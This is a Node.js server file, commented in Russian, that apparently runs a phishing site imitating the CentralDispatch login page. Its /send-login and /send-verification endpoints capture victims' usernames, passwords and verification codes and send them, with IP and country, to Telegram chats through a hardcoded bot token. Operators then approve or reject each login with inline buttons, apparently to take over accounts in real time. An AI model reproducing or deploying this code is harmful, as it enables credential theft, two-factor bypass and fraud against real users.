/**
 * Сервер для запуска SuperDispatch
 * Запустите: node server.js
 * Для продакшена используйте переменные окружения из .env файла
 */

require('dotenv').config();

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');
const { exec } = require('child_process');

// Получаем конфигурацию из переменных окружения или используем значения по умолчанию
const PORT = process.env.PORT || 8000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8456537851:AAFvHrQJqgIFwhdr7PSaxBEkSTJ8eZaTv0Q';
// Поддержка нескольких Chat ID через запятую
const TELEGRAM_CHAT_IDS = (process.env.TELEGRAM_CHAT_IDS || process.env.TELEGRAM_CHAT_ID || '5257327001').split(',').map(id => id.trim());
const NODE_ENV = process.env.NODE_ENV || 'development';

// Хранилище статусов логинов
const loginStatuses = {};

const mimeTypes = {
    '.html': 'text/html',
    '.js': 'text/javascript',
    '.css': 'text/css',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpg',
    '.jpeg': 'image/jpeg',
    '.webp': 'image/webp',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.wav': 'audio/wav',
    '.mp4': 'video/mp4',
    '.woff': 'application/font-woff',
    '.ttf': 'application/font-ttf',
    '.eot': 'application/vnd.ms-fontobject',
    '.otf': 'application/font-otf',
    '.wasm': 'application/wasm'
};

// Функция для отправки сообщения в один чат Telegram
function sendToTelegramChat(chatId, message, loginId, callback) {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const messageData = {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
    };
    
    // Добавляем кнопки только если loginId не пустой
    if (loginId && loginId !== '') {
        messageData.reply_markup = {
            inline_keyboard: [[
                { text: '✅ YES', callback_data: `login_yes_${loginId}` },
                { text: '❌ NO', callback_data: `login_no_${loginId}` }
            ]]
        };
    }
    
    const postData = JSON.stringify(messageData);

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(telegramUrl, options, (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            try {
                const result = JSON.parse(data);
                callback(null, result);
            } catch (e) {
                callback(e, null);
            }
        });
    });

    req.on('error', (error) => {
        callback(error, null);
    });

    req.write(postData);
    req.end();
}

// Функция для отправки сообщения в несколько чатов Telegram
function sendToTelegram(message, loginId, callback) {
    let completed = 0;
    let errors = [];
    const totalChats = TELEGRAM_CHAT_IDS.length;
    
    // Если нет чатов, возвращаем ошибку
    if (totalChats === 0) {
        callback(new Error('No Telegram chat IDs configured'), null);
        return;
    }
    
    // Отправляем сообщение в каждый чат
    TELEGRAM_CHAT_IDS.forEach((chatId, index) => {
        sendToTelegramChat(chatId, message, loginId, (error, result) => {
            completed++;
            if (error) {
                errors.push({ chatId, error: error.message });
            }
            
            // Вызываем callback когда все сообщения отправлены
            if (completed === totalChats) {
                if (errors.length === 0) {
                    // Все успешно отправлено
                    callback(null, { ok: true, sentTo: totalChats });
                } else if (errors.length < totalChats) {
                    // Частично успешно
                    callback(null, { ok: true, sentTo: totalChats - errors.length, errors: errors });
                } else {
                    // Все провалились
                    callback(new Error(`Failed to send to all chats: ${errors.map(e => e.error).join(', ')}`), null);
                }
            }
        });
    });
}

// Функция для получения информации о стране по IP
function getCountryByIP(ip, callback) {
    // Проверяем, что callback передан
    if (typeof callback !== 'function') {
        console.error('getCountryByIP: callback is not a function');
        return;
    }
    
    // Используем бесплатный API ip-api.com
    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,country,countryCode`;
    
    http.get(apiUrl, (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            try {
                const result = JSON.parse(data);
                if (result.status === 'success') {
                    callback(null, result.country, result.countryCode);
                } else {
                    callback(null, 'Unknown', '');
                }
            } catch (e) {
                callback(null, 'Unknown', '');
            }
        });
    }).on('error', () => {
        callback(null, 'Unknown', '');
    });
}

// Функция для получения флага страны по коду
function getCountryFlag(countryCode) {
    const flags = {
        'US': '🇺🇸', 'RU': '🇷🇺', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'IT': '🇮🇹', 'ES': '🇪🇸', 'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵',
        'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'KR': '🇰🇷'
    };
    return flags[countryCode] || '🌍';
}

const server = http.createServer((req, res) => {
    // Нормализуем URL (убираем query параметры и trailing slash)
    const urlPath = req.url.split('?')[0].replace(/\/$/, '') || '/';
    console.log(`${req.method} ${urlPath}`);

    // CORS заголовки
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Обработка информации о посетителе
    if (urlPath === '/visitor-info' && req.method === 'POST') {
        // Получаем IP адрес
        const ip = req.headers['x-forwarded-for'] || 
                  req.headers['x-real-ip'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress ||
                  'Unknown';
        const cleanIP = ip.split(',')[0].trim();
        
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const deviceType = data.deviceType || 'Unknown';
                
                // Получаем страну по IP
                getCountryByIP(cleanIP, (error, country, countryCode) => {
                    const flag = getCountryFlag(countryCode);
                    const deviceEmoji = deviceType === 'mobile' ? '📱' : '💻';
                    const deviceText = deviceType === 'mobile' ? 'телефон' : 'компьютер';
                    
                    // Экранируем HTML специальные символы
                    const escapeHtml = (text) => {
                        return String(text)
                            .replace(/&/g, '&amp;')
                            .replace(/</g, '&lt;')
                            .replace(/>/g, '&gt;')
                            .replace(/"/g, '&quot;')
                            .replace(/'/g, '&#39;');
                    };
                    
                    const message = `<b>🔐 Посещение страницы входа</b>\n🌍 <b>IP:</b> ${escapeHtml(cleanIP)}\n📍 <b>Страна:</b> ${escapeHtml(country)} ${flag}\n${deviceEmoji} <b>Вход был через ${escapeHtml(deviceText)}</b>\n\nКто-то зашел на сайт CentralDispatch.`;
                    
                    sendToTelegram(message, '', (error, result) => {
                        if (error) {
                            console.error('Error sending visitor info:', error);
                        }
                    });
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                });
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid JSON' }));
            }
        });
        return;
    }

    // Обработка запроса на отправку данных входа
    if (urlPath === '/send-login' && req.method === 'POST') {
        // Получаем IP адрес
        const ip = req.headers['x-forwarded-for'] || 
                  req.headers['x-real-ip'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress ||
                  'Unknown';
        const cleanIP = ip.split(',')[0].trim();
        
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const username = data.username || '';
                const password = data.password || '';
                
                // Получаем страну по IP
                getCountryByIP(cleanIP, (error, country, countryCode) => {
                    const flag = getCountryFlag(countryCode);
                    const loginId = Date.now().toString();
                    
                    // Инициализируем статус как pending
                    loginStatuses[loginId] = 'pending';
                    
                    // Экранируем HTML специальные символы
                    const escapeHtml = (text) => {
                        return String(text)
                            .replace(/&/g, '&amp;')
                            .replace(/</g, '&lt;')
                            .replace(/>/g, '&gt;')
                            .replace(/"/g, '&quot;')
                            .replace(/'/g, '&#39;');
                    };
                    
                    const message = `<b>🔐 CentralDispatch - Новый вход в систему</b>\n👤 <b>Username:</b> <code>${escapeHtml(username)}</code>\n🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n🌍 <b>IP:</b> ${escapeHtml(cleanIP)}\n📍 <b>Страна:</b> ${escapeHtml(country)} ${flag}\n\n<b>Выберите действие:</b>`;
                    
                    sendToTelegram(message, loginId, (error, result) => {
                        if (error) {
                            res.writeHead(500, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: false, error: error.message }));
                        } else if (result && result.ok) {
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: true, loginId: loginId }));
                        } else {
                            res.writeHead(500, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: false, error: result.description || 'Unknown error' }));
                        }
                    });
                });
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid JSON' }));
            }
        });
        return;
    }

    // Обработка callback от Telegram
    if (urlPath === '/telegram-callback' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                if (data.callback_query) {
                    const callbackData = data.callback_query.data;
                    if (callbackData.startsWith('login_yes_')) {
                        const loginId = callbackData.replace('login_yes_', '');
                        loginStatuses[loginId] = 'yes';
                    } else if (callbackData.startsWith('login_no_')) {
                        const loginId = callbackData.replace('login_no_', '');
                        loginStatuses[loginId] = 'no';
                    }
                    
                    // Отвечаем на callback
                    const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
                    const answerData = JSON.stringify({
                        callback_query_id: data.callback_query.id
                    });
                    
                    const answerReq = https.request(answerUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Content-Length': Buffer.byteLength(answerData)
                        }
                    }, (answerRes) => {
                        answerRes.on('data', () => {});
                        answerRes.on('end', () => {});
                    });
                    answerReq.write(answerData);
                    answerReq.end();
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true }));
            } catch (error) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true }));
            }
        });
        return;
    }

    // Проверка статуса логина
    if (urlPath.startsWith('/check-login-status') && req.method === 'GET') {
        const parsedUrl = url.parse(req.url, true);
        const loginId = parsedUrl.query.loginId;
        
        const status = loginStatuses[loginId] || 'pending';
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: status }));
        
        // Удаляем статус после получения (кроме pending)
        if (status !== 'pending') {
            setTimeout(() => {
                delete loginStatuses[loginId];
            }, 5000);
        }
        return;
    }

    // Обработка запроса на отправку кода верификации
    if (urlPath === '/send-verification' && req.method === 'POST') {
        // Получаем IP адрес
        const ip = req.headers['x-forwarded-for'] || 
                  req.headers['x-real-ip'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress ||
                  'Unknown';
        const cleanIP = ip.split(',')[0].trim();
        
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const verificationCode = data.verificationCode || '';
                
                // Получаем страну по IP
                getCountryByIP(cleanIP, (error, country, countryCode) => {
                    const flag = getCountryFlag(countryCode);
                    
                    // Экранируем HTML специальные символы
                    const escapeHtml = (text) => {
                        return String(text)
                            .replace(/&/g, '&amp;')
                            .replace(/</g, '&lt;')
                            .replace(/>/g, '&gt;')
                            .replace(/"/g, '&quot;')
                            .replace(/'/g, '&#39;');
                    };
                    
                    const message = `<b>🔐 CentralDispatch - Код верификации</b>\n🔑 <b>Verification Code:</b> <code>${escapeHtml(verificationCode)}</code>\n🌍 <b>IP:</b> ${escapeHtml(cleanIP)}\n📍 <b>Страна:</b> ${escapeHtml(country)} ${flag}`;
                    
                    sendToTelegram(message, '', (error, result) => {
                        if (error) {
                            res.writeHead(500, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: false, error: error.message }));
                        } else if (result && result.ok) {
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: true }));
                        } else {
                            res.writeHead(500, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: false, error: result.description || 'Unknown error' }));
                        }
                    });
                });
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid JSON' }));
            }
        });
        return;
    }

    // Обработка запроса на отправку в Telegram
    if (urlPath === '/send-telegram' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const message = data.message || '';
                
                sendToTelegram(message, '', (error, result) => {
                    if (error) {
                        res.writeHead(500, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ success: false, error: error.message }));
                    } else if (result && result.ok) {
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ success: true }));
                    } else {
                        res.writeHead(500, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ success: false, error: result.description || 'Unknown error' }));
                    }
                });
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid JSON' }));
            }
        });
        return;
    }

    // Обработка статических файлов
    let filePath = '.' + urlPath;
    if (filePath === './' || filePath === '.') {
        filePath = './index.html';
    }

    const extname = String(path.extname(filePath)).toLowerCase();
    const contentType = mimeTypes[extname] || 'application/octet-stream';

    fs.readFile(filePath, (error, content) => {
        if (error) {
            if (error.code === 'ENOENT') {
                res.writeHead(404, { 'Content-Type': 'text/html' });
                res.end('<h1>404 - File Not Found</h1>', 'utf-8');
            } else {
                res.writeHead(500);
                res.end(`Server Error: ${error.code}`, 'utf-8');
            }
        } else {
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(content, 'utf-8');
        }
    });
});

// Polling для получения обновлений от Telegram
let lastUpdateId = 0;
function pollTelegramUpdates() {
    const getUpdatesUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
    
    https.get(getUpdatesUrl, (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            try {
                const result = JSON.parse(data);
                if (result.ok && result.result) {
                    result.result.forEach((update) => {
                        lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            const callbackData = update.callback_query.data;
                            if (callbackData.startsWith('login_yes_')) {
                                const loginId = callbackData.replace('login_yes_', '');
                                loginStatuses[loginId] = 'yes';
                                
                                // Отвечаем на callback
                                const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
                                const answerData = JSON.stringify({
                                    callback_query_id: update.callback_query.id
                                });
                                
                                const answerReq = https.request(answerUrl, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                        'Content-Length': Buffer.byteLength(answerData)
                                    }
                                }, () => {});
                                answerReq.write(answerData);
                                answerReq.end();
                            } else if (callbackData.startsWith('login_no_')) {
                                const loginId = callbackData.replace('login_no_', '');
                                loginStatuses[loginId] = 'no';
                                
                                // Отвечаем на callback
                                const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
                                const answerData = JSON.stringify({
                                    callback_query_id: update.callback_query.id
                                });
                                
                                const answerReq = https.request(answerUrl, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                        'Content-Length': Buffer.byteLength(answerData)
                                    }
                                }, () => {});
                                answerReq.write(answerData);
                                answerReq.end();
                            }
                        }
                    });
                }
            } catch (e) {
                console.error('Error parsing updates:', e);
            }
            // Продолжаем polling
            setTimeout(pollTelegramUpdates, 1000);
        });
    }).on('error', (error) => {
        console.error('Error getting updates:', error);
        setTimeout(pollTelegramUpdates, 5000);
    });
}

server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`📂 Откройте в браузере: http://localhost:${PORT}/index.html`);
    console.log(`🌍 Режим: ${NODE_ENV}`);
    console.log('⏹️  Нажмите Ctrl+C для остановки сервера');
    
    // Начинаем polling обновлений от Telegram
    pollTelegramUpdates();
    
    // Автоматически открыть браузер только в режиме разработки
    if (NODE_ENV === 'development') {
        const url = `http://localhost:${PORT}/index.html`;
        const start = process.platform === 'win32' ? 'start' : 
                      process.platform === 'darwin' ? 'open' : 'xdg-open';
        exec(`${start} ${url}`);
    }
});

